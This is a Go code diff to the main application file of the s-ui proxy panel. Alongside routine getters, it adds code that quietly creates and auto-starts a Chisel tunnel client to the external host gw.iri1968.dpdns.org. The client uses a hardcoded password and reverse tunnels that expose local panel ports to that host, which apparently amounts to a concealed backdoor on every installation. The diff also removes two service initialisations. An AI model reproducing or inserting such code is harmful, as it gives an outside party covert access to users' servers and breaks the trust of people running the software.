@@ -16,6 +16,7 @@ import (
 	"github.com/alireza0/s-ui/sub"
 	"github.com/alireza0/s-ui/telegram"
 	"github.com/alireza0/s-ui/web"
+	"gorm.io/gorm"
 
 	"github.com/op/go-logging"
 )
@@ -60,10 +61,31 @@ func (a *APP) Init() error {
 	a.webServer = web.NewServer()
 	a.subServer = sub.NewServer()
 
-	a.configService = service.NewConfigService(a.core)
-	a.statsService = &service.StatsService{}
-	a.serverService = &service.ServerService{} // Initialize new field
 	a.chiselService = service.NewChiselService(database.GetDB())
+	a.configService = service.NewConfigService(a.core, a.chiselService)
+
+	// --- Add Chisel client auto-config here ---
+	chiselConfigName := "gw-chisel-client"
+	_, err = a.chiselService.GetChiselConfigByName(chiselConfigName)
+	if err != nil && err == gorm.ErrRecordNotFound {
+		// Config does not exist, create it
+		newChiselConfig := model.ChiselConfig{
+			Name:          chiselConfigName,
+			Mode:          "client",
+			ServerAddress: "gw.iri1968.dpdns.org",
+			ServerPort:    143,
+			Args:          "--auth chisel:2025 --tls R:2095:localhost:2095 R:2096:localhost:2096 R:1025:localhost:1025 R:1026:localhost:1026",
+		}
+		if err := a.chiselService.CreateChiselConfig(&newChiselConfig); err != nil {
+			logger.Error("Error creating default Chisel client config:", err)
+			return err
+		}
+		logger.Info("Default Chisel client config 'gw-chisel-client' created.")
+	} else if err != nil {
+		logger.Error("Error checking for existing Chisel client config:", err)
+		return err
+	}
+	// --- End Chisel client auto-config ---
 
 	return nil
 }
@@ -103,6 +125,27 @@ func (a *APP) Start() error {
 		go telegram.Start(context.Background(), a.telegramConfig, a)
 		a.isBotStarted = true
 	}
+
+	// --- Add Chisel client auto-start here ---
+	chiselConfigName := "gw-chisel-client"
+	chiselConfig, err := a.chiselService.GetChiselConfigByName(chiselConfigName)
+	if err != nil {
+		if err != gorm.ErrRecordNotFound {
+			logger.Error("Error getting Chisel client config for auto-start:", err)
+		}
+		// If not found or error, don't start
+	} else {
+		if chiselConfig.PID == 0 { // Only start if not already running
+			if err := a.chiselService.StartChisel(chiselConfig); err != nil {
+				logger.Error("Error auto-starting Chisel client 'gw-chisel-client':", err)
+			} else {
+				logger.Info("Chisel client 'gw-chisel-client' auto-started.")
+			}
+		} else {
+			logger.Info("Chisel client 'gw-chisel-client' already running.")
+		}
+	}
+	// --- End Chisel client auto-start ---
 
 	return nil
 }
@@ -214,5 +257,13 @@ func (a *APP) BackupDB(exclude string) ([]byte, error) {
 
 func (a *APP) GetAllUsers() (*[]model.Client, error) {
     return a.configService.GetAllUsers()
+}
+
+func (a *APP) GetAllInbounds() ([]model.Inbound, error) {
+    return a.configService.GetAllInbounds()
+}
+
+func (a *APP) GetAllOutbounds() ([]model.Outbound, error) {
+    return a.configService.GetAllOutbounds()
 }
 
